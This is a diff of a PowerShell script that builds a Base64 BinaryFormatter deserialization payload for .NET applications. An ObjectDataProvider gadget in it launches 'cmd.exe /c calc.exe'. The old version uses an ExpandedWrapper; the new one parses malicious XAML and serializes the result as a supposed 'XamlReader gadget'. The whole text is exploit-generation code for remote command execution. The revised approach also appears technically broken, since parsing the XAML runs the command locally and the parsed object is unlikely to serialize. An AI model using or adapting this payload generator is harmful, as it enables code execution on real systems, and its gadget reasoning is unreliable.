@@ -1,53 +1,53 @@
-# 1. Load the required assemblies into the PowerShell session
+# 1. Load all required assemblies for the gadget chain
 Add-Type -AssemblyName PresentationFramework
-Add-Type -AssemblyName System.Data.Services
 Add-Type -AssemblyName WindowsBase
+Add-Type -AssemblyName System.Xaml
 
-# 2. Define the C# payload generator
+# 2. Define the C# payload generator using the correct XamlReader gadget
 $csharpCode = @"
 using System;
 using System.IO;
 using System.Runtime.Serialization.Formatters.Binary;
-using System.Windows.Data;
-using System.Data.Services.Internal;
+using System.Windows.Markup;
 
 public class PayloadGenerator
 {
     public static string Generate()
     {
-        // Create the ObjectDataProvider
-        ObjectDataProvider odp = new ObjectDataProvider();
-        
-        // Set the ObjectInstance to the Process Type (for static method invocation)
-        odp.ObjectInstance = typeof(System.Diagnostics.Process);
-        
-        // Add MethodParameters BEFORE setting MethodName (Order is critical)
-        odp.MethodParameters.Add("cmd.exe");
-        odp.MethodParameters.Add("/c calc.exe");
-        
-        // Set the MethodName
-        odp.MethodName = "Start";
+        // 1. Define the malicious XAML payload that uses ObjectDataProvider
+        string xamlPayload = @"
+<ResourceDictionary
+    xmlns='http://schemas.microsoft.com/winfx/2006/xaml/presentation'
+    xmlns:x='http://schemas.microsoft.com/winfx/2006/xaml'
+    xmlns:System='clr-namespace:System;assembly=mscorlib'
+    xmlns:Diag='clr-namespace:System.Diagnostics;assembly=System'>
+    <ObjectDataProvider x:Key='obj' ObjectType='{x:Type Diag:Process}' MethodName='Start'>
+        <ObjectDataProvider.MethodParameters>
+            <System:String>cmd.exe</System:String>
+            <System:String>/c calc.exe</System:String>
+        </ObjectDataProvider.MethodParameters>
+    </ObjectDataProvider>
+</ResourceDictionary>";
 
-        // Wrap in ExpandedWrapper to make it serializable
-        ExpandedWrapper<ObjectDataProvider, object> wrapper = new ExpandedWrapper<ObjectDataProvider, object>();
-        wrapper.ExpandedElement = odp;
+        // 2. Parse the XAML to create the live object graph (XamlReader gadget)
+        object xamlReader = XamlReader.Parse(xamlPayload);
 
-        // Serialize to Base64
+        // 3. Serialize the XamlReader object with BinaryFormatter
         BinaryFormatter formatter = new BinaryFormatter();
         using (MemoryStream ms = new MemoryStream())
         {
-            formatter.Serialize(ms, wrapper);
+            formatter.Serialize(ms, xamlReader);
             return Convert.ToBase64String(ms.ToArray());
         }
     }
 }
 "@
 
-# 3. Compile the C# code, explicitly adding WindowsBase to the references
-Add-Type -TypeDefinition $csharpCode -ReferencedAssemblies PresentationFramework, System.Data.Services, WindowsBase
+# 3. Compile the C# code, referencing all necessary assemblies
+Add-Type -TypeDefinition $csharpCode -ReferencedAssemblies PresentationFramework, WindowsBase, System.Xaml
 
-# 4. Execute the generator
+# 4. Execute the generator and output the payload
 $base64Payload = [PayloadGenerator]::Generate()
 
-Write-Host "Base64 Payload:" -ForegroundColor Green
+Write-Host "Base64 BinaryFormatter Payload (XamlReader Gadget):" -ForegroundColor Green
 Write-Host $base64Payload
